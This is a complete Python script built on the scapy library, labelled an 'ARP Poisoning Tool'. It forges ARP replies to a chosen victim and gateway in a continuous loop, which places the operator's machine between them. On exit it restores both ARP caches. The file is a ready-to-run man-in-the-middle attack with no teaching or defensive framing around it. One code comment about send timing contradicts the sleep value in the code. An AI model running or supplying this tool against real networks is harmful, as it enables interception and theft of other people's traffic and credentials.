#!/usr/bin/env python3
from scapy.all import *
import time
import argparse

def get_mac(interface):
    """Get the MAC address of the specified interface"""
    return get_if_hwaddr(interface)

def poison_arp(victim_ip, victim_mac, spoof_ip, interface):
    """Send fake ARP reply to poison victim's ARP cache"""
    packet = Ether(dst=victim_mac) / ARP(
        op=2,  # ARP reply
        psrc=spoof_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=get_mac(interface)
    )
    sendp(packet, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="ARP Poisoning Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-t", "--target", required=True, help="Victim IP")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    args = parser.parse_args()

    interface = args.interface
    victim_ip = args.target
    gateway_ip = args.gateway
    attacker_ip = get_if_addr(interface)
    attacker_mac = get_mac(interface)

    # Learn MAC addresses of victim and gateway
    victim_mac = getmacbyip(victim_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if not victim_mac or not gateway_mac:
        print("Could not resolve MAC addresses. Ensure victim and gateway are reachable.")
        return

    print(f"Starting ARP poisoning attack...")
    print(f"Attacker IP: {attacker_ip}, MAC: {attacker_mac}")
    print(f"Victim IP: {victim_ip}, MAC: {victim_mac}")
    print(f"Gateway IP: {gateway_ip}, MAC: {gateway_mac}")
    print(f"Spoofing {gateway_ip} as {attacker_mac} to {victim_ip}")
    print(f"Spoofing {victim_ip} as {attacker_mac} to {gateway_ip}")

    try:
        while True:
            # Poison victim's ARP cache (spoof gateway)
            poison_arp(victim_ip, victim_mac, gateway_ip, interface)
            # Poison gateway's ARP cache (spoof victim)
            poison_arp(gateway_ip, gateway_mac, victim_ip, interface)
            time.sleep(0.5)  # Send every 0.1 seconds to outpace corrective ARPs
    except KeyboardInterrupt:
        print("\nStopping ARP poisoning attack...")
        # Send restore packets to fix ARP caches
        restore_arp(victim_ip, victim_mac, gateway_ip, interface)
        restore_arp(gateway_ip, gateway_mac, victim_ip, interface)

def restore_arp(victim_ip, victim_mac, original_ip, interface):
    """Send ARP reply to restore original IP-MAC mapping"""
    original_mac = getmacbyip(original_ip)
    if not original_mac:
        return
    packet = Ether(dst=victim_mac) / ARP(
        op=2,
        psrc=original_ip,
        pdst=victim_ip,
        hwdst=victim_mac,
        hwsrc=original_mac
    )
    sendp(packet, count=5, verbose=False)
    print(f"Restored {original_ip} -> {original_mac} for {victim_ip}")

if __name__ == "__main__":
    main()
